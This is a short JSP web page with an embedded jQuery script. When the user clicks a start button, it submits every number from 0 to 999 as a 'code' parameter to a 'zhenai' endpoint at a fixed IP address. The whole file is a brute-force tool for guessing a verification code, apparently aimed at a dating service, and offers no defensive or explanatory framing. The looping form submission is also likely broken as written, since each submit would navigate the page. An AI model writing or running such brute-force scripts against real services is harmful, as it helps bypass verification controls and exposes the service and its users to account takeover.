<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>珍爱</title>
    <script src="${pageContext.request.contextPath}/js/jquery-1.12.4.js"></script>
    <script>
        $(function () {
            $("#btn").click(function () {
                for (var i=0;i<=999;i++)
                {
                    $("#code").val(i);
                    $("#verifyCode").submit();
                }
            });
        });
    </script>
</head>
<body>
<form id="verifyCode" action="http://192.1.10.97/zhenai" method="get">
    code: <input id="code" type="text" name="code"/>
</form>
<input type="button" value="开始" id="btn"/>
</body>
</html>